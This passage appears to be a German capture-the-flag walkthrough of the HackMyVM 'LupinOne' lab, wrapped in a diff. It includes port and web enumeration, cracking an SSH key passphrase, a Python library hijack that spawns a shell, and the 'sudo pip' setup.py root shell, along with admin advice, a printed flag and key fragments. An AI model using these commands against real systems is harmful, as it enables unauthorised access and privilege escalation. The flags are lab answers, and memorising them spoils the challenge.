@@ -1,0 +1,517 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LupinOne - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>LupinOne - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">ping6</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">CyberChef (impliziert)</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">nano / vi</div>
+                <div class="tool-item">os (Python module)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">python3.9</div>
+                <div class="tool-item">pip</div>
+                <div class="tool-item">mktemp</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">tty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance (IPv4 & IPv6)</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (User Dirs & Secrets)</a></li>
+                <li><a href="#credential-access">Credential Access (Base58 & SSH Key Crack)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as icex64)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Python Lib Hijack & Pip)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance (IPv4 & IPv6)</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.135	08:00:27:60:64:b0	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk durchgeführt, um aktive Hosts auf Layer 2 zu entdecken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host mit der IPv4-Adresse `192.168.2.135` wird identifiziert. Die MAC-Adresse gehört zu Oracle VirtualBox (PCS Systemtechnik GmbH), was auf eine virtuelle Maschine hindeutet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die IPv4-Adresse ist bekannt. Prüfen Sie auch auf IPv6-Präsenz und führen Sie Portscans für beide Protokolle durch.
+<br><strong>Empfehlung (Admin):** Standard Netzwerk-Monitoring. Absicherung der VM.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ping6 -c2 -n -I eth0 ff02::1</span></div>
+                    <pre>
+PING ff02::1(ff02::1) from :: eth0: 56 data bytes
+64 bytes from <span class="command">fe80::a00:27ff:fe09:b608%eth0</span>: icmp_seq=1 ttl=64 time=0.027 ms
+64 bytes from <span class="command">fe80::a00:27ff:fe60:64b0%eth0</span>: icmp_seq=1 ttl=255 time=0.380 ms <span class="comment"><-- Ziel?</span>
+64 bytes from fe80::1%eth0: icmp_seq=1 ttl=64 time=0.819 ms
+64 bytes from fe80::a00:27ff:fe09:b608%eth0: icmp_seq=2 ttl=64 time=0.027 ms
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird ein IPv6-Ping (`ping6`) an die All-Nodes-Multicast-Adresse (`ff02::1`) auf dem Interface `eth0` gesendet, um aktive IPv6-Nachbarn im lokalen Netzwerk zu finden (`-c2`: zwei Pakete, `-n`: keine Namensauflösung, `-I eth0`: Interface).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere IPv6-Link-Local-Adressen antworten. Die Adresse `fe80::a00:27ff:fe60:64b0%eth0` korreliert mit der MAC-Adresse des zuvor gefundenen IPv4-Hosts (`...60:64:b0`) und ist somit sehr wahrscheinlich die IPv6-Adresse des Zielsystems.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Das Ziel ist auch über IPv6 erreichbar. Führen Sie einen Nmap-Scan gegen diese IPv6-Adresse durch, um offene Ports zu identifizieren.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass IPv6 bewusst aktiviert und konfiguriert ist. Wenn es nicht benötigt wird, sollte es deaktiviert werden, um die Angriffsfläche zu reduzieren. Firewall-Regeln müssen auch IPv6 abdecken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -p- fe80::a00:27ff:fe60:64b0%eth0 -6 -v</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 23:42 CEST
+Initiating ND Ping Scan at 23:42
+Scanning fe80::a00:27ff:fe60:64b0 [1 port]
+Completed ND Ping Scan at 23:42, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:42
+Completed Parallel DNS resolution of 1 host. at 23:42, 0.00s elapsed
+Initiating SYN Stealth Scan at 23:42
+Scanning Lupinne (fe80::a00:27ff:fe60:64b0) [65535 ports]
+Discovered open port <span class="command">80/tcp</span> on fe80::a00:27ff:fe60:64b0
+Discovered open port <span class="command">22/tcp</span> on fe80::a00:27ff:fe60:64b0
+Completed SYN Stealth Scan at 23:42, 2.31s elapsed (65535 total ports)
+Nmap scan report for Lupinne (fe80::a00:27ff:fe60:64b0)
+Host is up (0.00041s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+<span class="command">22/tcp open  ssh</span>
+<span class="command">80/tcp open  http</span>
+MAC Address: 08:00:27:60:64:B0 (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds
+           Raw packets sent: 65536 (4.194MB) | Rcvd: 65536 (3.932MB)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird explizit gegen die gefundene IPv6-Link-Local-Adresse durchgeführt (`-6`: IPv6-Scan, `-p-`: Alle Ports, `-v`: Verbose). Das Interface (`%eth0`) muss bei Link-Local-Adressen angegeben werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt, dass die Ports 22 (SSH) und 80 (HTTP) auch über IPv6 offen und erreichbar sind. Es werden keine weiteren Ports gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die gleichen Dienste sind über IPv4 und IPv6 verfügbar. Die weitere Enumeration kann sich auf die IPv4-Adresse konzentrieren, da dies oft einfacher ist, aber die IPv6-Erreichbarkeit sollte im Hinterkopf behalten werden. Nächster Schritt: Webserver-Enumeration auf Port 80 (IPv4).
+<br><strong>Empfehlung (Admin):** Sicherstellen, dass Firewall-Regeln sowohl für IPv4 als auch für IPv6 konsistent sind. Dienste, die nicht über IPv6 erreichbar sein sollen, entsprechend konfigurieren.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (User Dirs & Secrets)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ffuf -c -ic -r -u 'http://192.168.2.135/~FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html -fc 403</span></div>
+                     <pre>
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.5.0 Kali Exclusive <span class="comment"><3</span>
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.2.135/~FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+ :: Extensions       : .php .txt .html
+ :: Follow redirects : true
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+<span class="command">secret</span>  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 2ms]
+:: Progress: [4613/4613] :: Job [1/1] :: 1384 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `ffuf` wird verwendet, um nach Benutzerverzeichnissen auf dem Webserver zu suchen. Der Platzhalter `FUZZ` in der URL `http://192.168.2.135/~FUZZ` wird durch Einträge aus der Wortliste `common.txt` ersetzt. `-c`: Colorized Output, `-ic`: Ignore Comments, `-r`: Follow Redirects, `-e`: Test extensions, `-fc 403`: Filter status code 403.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `ffuf` findet ein valides Verzeichnis, das über die Tilde (`~`) erreichbar ist: `/~secret`. Dies deutet auf einen Benutzer oder ein Verzeichnis namens `secret` hin, dessen Inhalt über den Webserver zugänglich ist (Apache/Nginx `UserDir` Modul oder ähnliche Konfiguration).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie das gefundene Verzeichnis `/~secret` weiter mit Tools wie `ffuf` oder `gobuster`, um Dateien oder Unterverzeichnisse darin zu finden.
+<br><strong>Empfehlung (Admin):** Deaktivieren Sie das `UserDir`-Modul oder eine äquivalente Funktionalität, wenn Benutzer keine Webseiten in ihren Home-Verzeichnissen hosten sollen. Wenn es benötigt wird, stellen Sie sicher, dass der Zugriff angemessen eingeschränkt und konfiguriert ist.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ffuf -c -ic -r -u 'http://192.168.2.135/~secret/.FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php,.txt,.html -fc 403</span></div>
+                     <pre>
+... (ffuf Header) ...
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.2.135/~secret/.FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions       : .php .txt .html
+ :: Follow redirects : true
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response status: 403
+________________________________________________
+
+<span class="command">.mysecret.txt</span>           [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 24ms]
+:: Progress: [87677/87677] :: Job [1/1] :: 2509 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `ffuf` wird erneut verwendet, diesmal um innerhalb des Verzeichnisses `/~secret/` nach versteckten Dateien oder Verzeichnissen zu suchen (solche, die mit einem Punkt beginnen: `.FUZZ`). Es wird eine andere Wortliste (`directory-list-2.3-small.txt`) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Treffer wird erzielt: Die versteckte Datei `.mysecret.txt` wird gefunden. Der Statuscode 200 und die Größe von 4689 Bytes deuten darauf hin, dass die Datei existiert und Inhalt hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Laden Sie den Inhalt der Datei `http://192.168.2.135/~secret/.mysecret.txt` herunter (z.B. mit `curl` oder `wget`) und analysieren Sie ihn. Der Name legt nahe, dass sie sensible Informationen enthält.
+<br><strong>Empfehlung (Admin):** Verhindern Sie das Auflisten von Verzeichnissen (Directory Listing). Speichern Sie sensible Dateien niemals in öffentlich zugänglichen Web-Verzeichnissen, auch nicht, wenn sie "versteckt" sind (mit einem Punkt beginnen).</p>
+        </section>
+
+        <section id="credential-access">
+             <h2>Credential Access (Base58 & SSH Key Crack)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">curl "http://192.168.2.135/~secret/.mysecret.txt"</span></div>
+                     <pre><span class="password">cGxD6KNZQddY6iCsSuqPzU....Fa5zDgKm2gSRN8gHz3WqS</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/~secret/.mysecret.txt` wird mit `curl` abgerufen. Die Ausgabe ist ein langer String, der wie eine Base64- oder Base58-Kodierung aussieht.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der String wird mit einem Base58-Decoder (z.B. CyberChef, wie im Log angedeutet) dekodiert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Ausgabe nach Base58-Dekodierung]</div>
+                     <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp
+PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk
+9GXiytplgT9z/mP91NqU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotNvqaAdmsK+YL9
+... (SSH Key Body) ...
+iUJ66WmRUN9EoVlkeCzQJwivI=
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Dekodierung enthüllt einen privaten SSH-Schlüssel im OpenSSH-Format. Der Header `-----BEGIN OPENSSH PRIVATE KEY-----` und die Zeile `aes256-cbc` innerhalb des Schlüssels deuten stark darauf hin, dass der Schlüssel passwortgeschützt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Speichern Sie den dekodierten Schlüssel in einer Datei (z.B. `idid`). Verwenden Sie `ssh2john`, um den Hash der Passphrase aus dem Schlüssel zu extrahieren. Knacken Sie den Hash anschließend mit `john` und einer Wortliste.
+<br><strong>Empfehlung (Admin):** Speichern Sie niemals private Schlüssel, auch nicht kodiert, an öffentlich zugänglichen Orten. Verwenden Sie starke, einzigartige Passphrasen zum Schutz privater Schlüssel.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der extrahierte SSH-Schlüssel wird in der Datei `idid` gespeichert. `ssh2john` wird verwendet, um den Hash der Passphrase zu extrahieren und in `idhash` zu speichern. Anschließend wird `john` mit der `rockyou.txt`-Wortliste verwendet, um den Hash zu knacken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi idid</span></div> <!-- Schlüssel wird in Datei gespeichert -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ssh2john idid > idhash</span></div> <!-- Maskierung: > -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt idhash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">P@55w0rd!</span>        (idid)
+1g 0:00:00:... DONE (...) ...g/s ...p/s ...c/s ...C/s ...
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</pre>
+                </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> `john` knackt erfolgreich die Passphrase des SSH-Schlüssels: `<span class="password">P@55w0rd!</span>`. Dies ist ein relativ schwaches Passwort, das leicht erraten oder mit Wörterbuchattacken gefunden werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Verwenden Sie den privaten Schlüssel (`idid`) zusammen mit der geknackten Passphrase (`P@55w0rd!`), um sich per SSH anzumelden. Versuchen Sie gängige Benutzernamen oder den aus dem Webserver-Verzeichnis (`secret`) abgeleiteten Namen. Der spätere Login zeigt, dass der Benutzer `icex64` ist.
+<br><strong>Empfehlung (Admin):** Erzwingen Sie die Verwendung starker Passphrasen für SSH-Schlüssel. Schulen Sie Benutzer im sicheren Umgang mit Schlüsseln.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH as icex64)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Mit dem privaten Schlüssel (`idid`) und der geknackten Passphrase (`P@55w0rd!`) wird versucht, sich per SSH als Benutzer `icex64` anzumelden. (Der Benutzername `icex64` wurde vermutlich durch weitere Enumeration oder Raten ermittelt).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh icex64@192.168.2.135 -i idid</span></div>
+                    <pre>
+Enter passphrase for key 'idid': <span class="password">[Passwort P@55w0rd! eingegeben]</span>
+Linux Lupinne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+
+Welcome to Empire: Lupin ne
+
+Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
+</pre>
+                     <div class="prompt">icex64@Lupinne:~$</div> <!-- Login erfolgreich -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als Benutzer `icex64` ist erfolgreich. Der initiale Zugriff auf das System wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie Enumeration als Benutzer `icex64` durch: Suchen Sie nach dem User-Flag, prüfen Sie `sudo`-Rechte (`sudo -l`), SUID-Dateien, Cronjobs, interessante Dateien im Home-Verzeichnis etc., um Wege zur Privilegieneskalation zu finden.
+<br><strong>Empfehlung (Admin):** Überwachen Sie SSH-Logins. Wenn möglich, beschränken Sie SSH-Zugriff auf bestimmte IP-Adressen. Sorgen Sie für starke Passwörter/Passphrasen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `icex64` wird nach weltweit oder für den Benutzer beschreibbaren Dateien und Verzeichnissen gesucht, wobei Systempfade wie `/proc`, `/sys`, `/dev` ausgeschlossen werden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">icex64@Lupinne:~$ <span class="command">find / -writable ! -path '/proc*' ! -path '/sys*' ! -path '/dev*' -exec ls -al {} \; 2>/dev/null</span></div> <!-- Maskierung: > -->
+                     <pre>
+...
+-rw-r--r-- 1 icex64 icex64 1311 Oct  4  2021 authorized_keys
+-rw------- 1 icex64 icex64 3434 Oct  4  2021 id_rsa-aes256-cbc
+-rw-r--r-- 1 icex64 icex64  741 Oct  4  2021 id_rsa-aes256-cbc.pub
+-rw-r--r-- 1 icex64 icex64 1311 Oct  4  2021 /home/icex64/.ssh/authorized_keys
+-rw-r--r-- 1 icex64 icex64 741 Oct  4  2021 /home/icex64/.ssh/id_rsa-aes256-cbc.pub
+-rw------- 1 icex64 icex64 3434 Oct  4  2021 /home/icex64/.ssh/id_rsa-aes256-cbc
+-rw-r--r-- 1 icex64 icex64 807 Oct  4  2021 /home/icex64/.profile
+-rw------- 1 icex64 icex64 12 Oct  4  2021 /home/icex64/.python_history
+-rw-r--r-- 1 icex64 icex64 3526 Oct  4  2021 /home/icex64/.bashrc
+-rw-r--r-- 1 icex64 icex64 2801 Oct  4  2021 <span class="command">/home/icex64/user.txt</span>
+...
+</pre> <!-- Ausgabe gekürzt -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Suche findet primär Dateien im Home-Verzeichnis des Benutzers `icex64`, was erwartet wird. Es werden keine offensichtlich ungewöhnlichen, systemweiten beschreibbaren Dateien oder Verzeichnisse gefunden, die für eine einfache Privilegieneskalation genutzt werden könnten. Die Datei `user.txt` befindet sich im Home-Verzeichnis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Lesen Sie den Inhalt von `/home/icex64/user.txt`, um das User-Flag zu erhalten. Untersuchen Sie andere Privesc-Vektoren wie `sudo -l`.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass die Berechtigungen im Dateisystem restriktiv sind und Benutzer nicht unnötigerweise Schreibrechte außerhalb ihres Home-Verzeichnisses haben.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Das User-Flag wird ausgelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">cd icex64</span></div> <!-- Im Original fehlt der Prompt -->
+                     <pre>bash: cd: icex64: No such file or directory</pre> <!-- Fehler im Original -->
+                     <div class="prompt"># <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                     <div class="prompt"># <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag `<span class="password">3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</span>` wurde erfolgreich gelesen.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Python Lib Hijack & Pip)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Es wird festgestellt (Schritt `sudo -l` für `icex64` nicht gezeigt), dass `icex64` den Befehl `/usr/bin/python3.9 /home/arsene/heist.py` als Benutzer `arsene` ausführen darf. Um dies auszunutzen, wird eine System-Python-Bibliothek (`webbrowser.py`), die von `heist.py` wahrscheinlich importiert wird, modifiziert. Der Benutzer `icex64` hat anscheinend Schreibrechte auf diese Datei.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">icex64@Lupinne:~$ <span class="command">nano /usr/lib/python3.9/webbrowser.py</span></div>
+                     <pre>[Datei wird bearbeitet, Zeile hinzugefügt:]
+                         <span class="command">os.system("/bin/bash")</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Hinzufügen von `os.system("/bin/bash")` zu einer Systembibliothek ist ein klassischer Hijacking-Versuch. Wenn `heist.py` (ausgeführt als `arsene`) diese modifizierte Bibliothek importiert, wird der eingefügte Code ausgeführt und eine Shell als Benutzer `arsene` gestartet. Die Tatsache, dass `icex64` diese Datei bearbeiten kann, ist eine schwere Sicherheitslücke.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Der `sudo`-Befehl wird ausgeführt, um `heist.py` als `arsene` zu starten und den Hijack auszulösen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">icex64@Lupinne:~$ <span class="command">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span></div>
+                    <pre>Its not yet ready to get in action</pre>
+                     <div class="prompt">arsene@Lupinne:/home/icex64$</div> <!-- Shell als arsene erhalten! -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit funktioniert. Obwohl `heist.py` eine Meldung ausgibt, wird durch den Import der modifizierten `webbrowser.py` die eingefügte Bash-Shell gestartet. Der Angreifer hat nun eine Shell als Benutzer `arsene`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Privilegien wurden von `icex64` zu `arsene` eskaliert. Überprüfen Sie nun die `sudo`-Rechte für `arsene` (`sudo -l`).
+<br><strong>Empfehlung (Admin):** Korrigieren Sie sofort die Dateiberechtigungen von `/usr/lib/python3.9/webbrowser.py` (und anderen Systembibliotheken), sodass sie nicht von unprivilegierten Benutzern beschreibbar sind. Überprüfen Sie die `sudo`-Regel, die `icex64` erlaubt, Code als `arsene` auszuführen, und entfernen oder beschränken Sie sie.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Rechte für den Benutzer `arsene` werden überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">arsene@Lupinne:/home/icex64$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for arsene on Lupinne:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User arsene may run the following commands on Lupinne:
+    <span class="command">(root) NOPASSWD: /usr/bin/pip</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `arsene` darf `/usr/bin/pip` als `root` ohne Passwort ausführen (`NOPASSWD`). Dies ist ein bekannter Vektor zur Privilegieneskalation, dokumentiert in GTFOBins.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Der GTFOBins-Exploit für `sudo pip` wird angewendet. Ein temporäres Verzeichnis wird erstellt, eine bösartige `setup.py`-Datei darin platziert (die eine Shell startet) und dann `sudo pip install` auf dieses Verzeichnis ausgeführt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">arsene@Lupinne:/home/icex64$ <span class="command">cd /tmp/</span></div>
+                    <div class="prompt">arsene@Lupinne:/tmp$ <span class="command">TF=$(mktemp -d)</span></div>
+                     <div class="prompt">arsene@Lupinne:/tmp$ <span class="command">echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py</span></div> <!-- Maskierung: < > -->
+                     <div class="prompt">arsene@Lupinne:/tmp$ <span class="command">sudo pip install $TF</span></div>
+                     <pre>
+Processing ./tmp/tmp.HMHv3zHbs <span class="comment"><-- Name des temp. Verzeichnisses</span>
+  Preparing metadata (setup.py) ... done
+Building wheels for collected packages: UNKNOWN
+  Building wheel for UNKNOWN (setup.py) ... done
+  Created wheel for UNKNOWN: filename=UNKNOWN-0.0.0-py3-none-any.whl size=707 sha256=...
+  Stored in directory: /root/.cache/pip/wheels/... <span class="comment"><-- Läuft als Root!</span>
+Successfully built UNKNOWN
+Installing collected packages: UNKNOWN
+Successfully installed UNKNOWN-0.0.0
+</pre>
+                     <div class="prompt"># <span class="command">id</span></div> <!-- Root-Shell erhalten! -->
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                     <div class="prompt">#</div>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `sudo pip`-Exploit war erfolgreich. `pip` führte die `setup.py` als Root aus, was dem Angreifer eine Root-Shell verschaffte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Root-Zugriff wurde erlangt. Lesen Sie die Root-Flag aus `/root/root.txt`.
+<br><strong>Empfehlung (Admin):** Entfernen Sie sofort die unsichere `sudo`-Regel, die `arsene` erlaubt, `pip` als Root auszuführen. Gewähren Sie niemals `sudo`-Rechte für Paketmanager, insbesondere nicht mit `NOPASSWD`.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird das Root-Flag gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">cd /root</span></div>
+                    <div class="prompt"># <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                    <div class="prompt"># <span class="command">cat root.txt</span></div>
+                    <pre>
+*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,                       .&&&&&&&(            /&&&&&&&                       <span class="comment"><-- Maskierung: & zu &amp;</span>
+,                    &&&&&&*                          @&&&&&&                   
+,                *&&&&&                                   &&&&&&                
+,              &&&&&                                         &&&&&.             
+,            &&&&                   ./#%@@&#,                   &&&&*           
+,          &%&&          &&&&&&&&&&&,&&(&&&&&&&&             &&&&          
+,        &@(&        &&&&&&&&&&&&&&.....,&&*&&&&&&&&             &&&&        
+,      .& &          &&&&&&&&&&&&&      &&.&&&&&&&&&               &%&       
+,     @& &           &&&&&&&&&&&&&      && &&&&&&&&&                @&&&     
+,    &%((            &&&&&&&&&&&&&      && &&&&&&&&&                 #&&&    
+,   &#/*             &&&&&&&&&&&&&      && #&&&&&&&&(&                 (&&&   
+,  %@ &              &&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/  
+,  & &               &&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &  
+, & &                &&&&&&&&&&&&&,&     &&& &&&&&&&&&&(                   &,&@ 
+,.& #                #&&&&&&&&&&&&(&     &&&.&&&&&&&&&&                   & & 
+*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
+*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
+*& *              &&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
+*&              &&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
